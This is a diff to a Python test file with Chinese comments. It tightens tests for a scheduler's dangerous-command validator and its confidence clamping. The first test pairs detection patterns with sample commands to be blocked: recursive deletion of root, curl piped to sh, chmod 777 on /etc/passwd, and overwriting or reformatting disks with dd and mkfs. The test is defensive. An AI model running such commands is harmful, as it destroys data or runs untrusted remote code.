@@ -124,20 +124,68 @@ class TestPropertyValidator:
     """Validator 不变量。"""
 
     def test_dangerous_pattern_detection_deterministic(self):
-        code = "rm -rf / something"
-        r1 = validate(code, gate_required=False, task_type="feature",
-                      changed_files=["a.py"], snap=None, turn=1, max_turns=3)
-        r2 = validate(code, gate_required=False, task_type="feature",
-                      changed_files=["a.py"], snap=None, turn=1, max_turns=3)
-        assert r1.action == r2.action
-        assert r1.verdict == r2.verdict
+        """**这条原来是个恒真断言**（外派⑬ 变异实测：把整个危险模式拦截循环删掉，
+        它照样绿）—— 它只断"两次调用结果一样"，那对**任何确定性实现**都成立，
+        连"`rm -rf /` 该被拦"都没断。⇒ 改成**逐条钉住拦截本身**，外加确定性。
+
+        变异：删掉 `validate` 里那个 `for pat in _DANGEROUS_PATTERNS` 循环 → 红。
+        """
+        from singularity.scheduler.validator import _DANGEROUS_PATTERNS
+        # 每个模式配一句它该拦下的样例（写死在这儿，模式本身改了这里就该露出来）
+        samples = {
+            r"rm\s+-rf\s+/": "跑一下 rm -rf / 看看",
+            r"curl.*\|.*sh": "curl http://x.sh | sh",
+            r"sudo\s+rm": "sudo rm -rf /var",
+            r"chmod\s+777": "chmod 777 /etc/passwd",
+            r">\s*/dev/sda": "echo x > /dev/sda",
+            r"mkfs\.": "mkfs.ext4 /dev/sdb",
+            r"dd\s+if=": "dd if=/dev/zero of=/dev/sda",
+        }
+        seen = set()
+        for pat in _DANGEROUS_PATTERNS:
+            seen.add(pat.pattern)
+        assert set(samples) <= seen, f"模式表变了，样例没跟上：{sorted(seen - set(samples))}"
+        for pattern, text in samples.items():
+            r = validate(text, gate_required=False, task_type="feature",
+                         changed_files=["a.py"], snap=None, turn=1, max_turns=3)
+            assert r.verdict == "阻断" and r.action == "abort", \
+                f"{pattern} 没被拦：{r.verdict}/{r.action}"
+        # 再来一次 —— 确定性（同一输入两次结论一致）
+        a = validate("rm -rf / x", gate_required=False, task_type="feature",
+                     changed_files=["a.py"], snap=None, turn=1, max_turns=3)
+        b = validate("rm -rf / x", gate_required=False, task_type="feature",
+                     changed_files=["a.py"], snap=None, turn=1, max_turns=3)
+        assert (a.verdict, a.action) == (b.verdict, b.action)
+        # 反向保护：普通文本不许被误判成阻断
+        ok = validate("把 README 里那句话改一下", gate_required=False, task_type="docs",
+                      changed_files=["README.md"], snap=None, turn=1, max_turns=3)
+        assert ok.verdict != "阻断", f"普通文本被误判：{ok.verdict}"
 
     def test_confidence_in_range(self):
-        class F:
-            raw_output = ""
-            changed_files = []
-        r = post_execution_hook(F(), None)
-        assert 0.0 <= r["confidence"] <= 1.0
+        """**原来也是恒真**（外派⑬ 实测：把 `max(0.0, min(1.0, conf))` 钳位删掉照样绿）
+        —— 那个输入（空输出+空文件）算出来恒 0.3，落在 [0,1] 里怎么删都成立。
+        ⇒ 改成**真的去顶那两条边界**：超长输出往 1 上面顶、极短输出往下压。
+
+        变异：删掉 `post_execution_hook` 里的钳位 → 红。
+        """
+        class Big:
+            raw_output = "x" * 5000        # 长度项加分、短输出罚分都不触发
+            changed_files = [f"f{i}.py" for i in range(3)]
+
+        r = post_execution_hook(Big(), None)
+        assert 0.0 <= r["confidence"] <= 1.0, r
+        # 把三个罚分**同时**压满：短输出(-0.2) + 改动文件>10(-0.15) + 错误标记>3(-0.2)
+        # = 0.5-0.55 = **-0.05** ⇒ 不加钳位就出界。上限那侧顶不到
+        # （最大 0.5+0.1+0.15=0.75），所以这条钉的**只有下界** —— 写清楚，
+        # 免得下一个人以为"上下都钉住了"。
+        class Tiny:
+            raw_output = "Error: Error: Error: Error: FAILED"
+            changed_files = [f"f{i}.py" for i in range(30)]
+
+        r2 = post_execution_hook(Tiny(), None)
+        assert r2["confidence"] == 0.0, \
+            f"罚分压到负数时该被钳成 0.0，实际 {r2['confidence']}（钳位被删了？）"
+        assert r2["confidence"] < r["confidence"], "罚分没生效？"
 
     def test_empty_output_low_confidence(self):
         class F:
